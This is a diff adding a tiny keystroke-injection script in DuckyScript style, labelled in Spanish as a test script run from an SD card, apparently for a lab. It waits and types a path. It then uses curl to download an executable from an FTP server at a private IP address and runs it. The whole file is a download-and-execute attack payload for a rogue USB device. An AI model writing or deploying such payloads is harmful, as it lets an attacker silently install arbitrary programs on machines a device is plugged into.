@@ -1,0 +1,6 @@
+REM Script de prueba desde SD
+DELAY 3000
+C:\Users\LABDEI\Desktop\
+curl -o 1.exe ftp://172.17.87.102/2.exe
+DELAY 5000
+1.exe & exit
